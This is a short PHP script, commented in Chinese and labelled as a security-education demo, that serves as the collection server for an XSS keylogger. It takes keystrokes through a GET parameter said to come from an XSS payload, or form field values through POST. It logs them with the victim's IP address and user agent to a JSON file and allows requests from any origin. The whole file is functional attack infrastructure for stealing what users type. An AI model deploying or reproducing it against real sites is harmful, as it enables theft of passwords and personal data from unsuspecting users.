<?php
/**
 * 保存键盘记录数据
 * ⚠️ 仅用于安全教育演示目的
 */

// 允许跨域请求（演示用）
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// 数据文件路径
$keylogFile = __DIR__ . '/data/keylog.txt';

// 确保data目录存在
if (!is_dir(__DIR__ . '/data')) {
    mkdir(__DIR__ . '/data', 0755, true);
}

// 获取客户端信息
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '未知';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '未知';
$timestamp = date('Y-m-d H:i:s');

// 读取现有数据
$keylogs = [];
if (file_exists($keylogFile)) {
    $content = file_get_contents($keylogFile);
    if (!empty($content)) {
        $keylogs = json_decode($content, true) ?: [];
    }
}

// 处理GET或POST请求
$keys = '';
$fields = [];

// 支持GET请求（来自XSS Payload）
if (isset($_GET['k'])) {
    $keys = $_GET['k'];
}

// 支持POST请求（来自演示页面）
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $keys = $_POST['keys'] ?? $keys;
    $fields = isset($_POST['fields']) ? json_decode($_POST['fields'], true) : [];
}

if (!empty($keys) || !empty($fields)) {
    // 添加新记录
    $keylogs[] = [
        'timestamp' => $timestamp,
        'ip' => $ip,
        'userAgent' => $userAgent,
        'keys' => $keys,
        'fields' => $fields
    ];
    
    // 保存到文件
    file_put_contents($keylogFile, json_encode($keylogs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    echo json_encode(['success' => true, 'message' => '记录已保存']);
} else {
    echo json_encode(['success' => false, 'message' => '无数据']);
}